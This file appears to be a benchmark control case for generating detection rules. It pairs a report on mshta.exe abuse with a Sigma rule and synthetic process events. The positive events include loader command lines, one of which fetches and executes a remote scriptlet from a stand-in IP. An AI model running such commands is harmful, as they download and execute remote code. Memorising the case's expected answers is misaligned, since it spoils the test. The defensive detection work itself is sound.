@@ -1,0 +1,135 @@
+id: CTL1-04
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tags match T1218.005, every positive and filter value is quoted in the evidence, the
+  positive part needs an http, vbscript: or javascript: argument, and the ''not'' filter removes only
+  the documented HR portal launcher (parent hrportal.exe plus hrportal.hta), so the look-alike launcher
+  event does not match.'
+expected_gate: none
+report_text: 'Several endpoints started mshta.exe with a URL or inline script instead of a local application
+  file. Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe
+  vbscript:Execute(window.close). Remote HTA content and inline vbscript: or javascript: URIs were the
+  loaders used throughout this campaign. One internal tool, the HR portal launcher hrportal.exe, also
+  starts mshta.exe but always with its local file hrportal.hta, so that launcher is a known false positive
+  and should be excluded. Detection should cover mshta.exe invoked with an http, vbscript: or javascript:
+  argument.'
+evidence:
+- Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close).
+- One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local
+  file hrportal.hta
+- 'Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument.'
+logsource: windows_process_creation
+techniques:
+- T1218.005
+sigma_yaml: |
+  title: Mshta Executing Remote or Inline Script Content
+  id: 9e3fad41-6075-4c9e-b224-5fa170c24d04
+  status: experimental
+  description: 'Detects mshta.exe started with an http URL or an inline vbscript: or javascript: argument, excluding the known HR portal launcher.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.005
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\mshta.exe'
+    selection_cli:
+      CommandLine|contains:
+        - 'http'
+        - 'vbscript:'
+        - 'javascript:'
+    filter_hr:
+      ParentImage|endswith: '\hrportal.exe'
+      CommandLine|contains: 'hrportal.hta'
+    condition: selection_img and selection_cli and not filter_hr
+  falsepositives:
+    - 'The HR portal launcher is excluded; other internal HTA applications opened from a URL'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe http://docs.cranemail.test/invoice.hta
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe vbscript:Execute(window.close)
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\mshta.exe
+    cmd: mshta.exe javascript:a=GetObject('script:http://203.0.113.9/x.sct').Exec();close()
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\todo.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe "C:\Program Files\HRPortal\hrportal.hta" http://hr.lab.invalid/sso
+    parent: C:\Program Files\HRPortal\hrportal.exe
+    parent_cmd: '"C:\Program Files\HRPortal\hrportal.exe"'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe "C:\Program Files\HRPortal\help.hta"
+    parent: C:\Program Files\HRPortal\hrportal.exe
+    parent_cmd: '"C:\Program Files\HRPortal\hrportal.exe"'
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
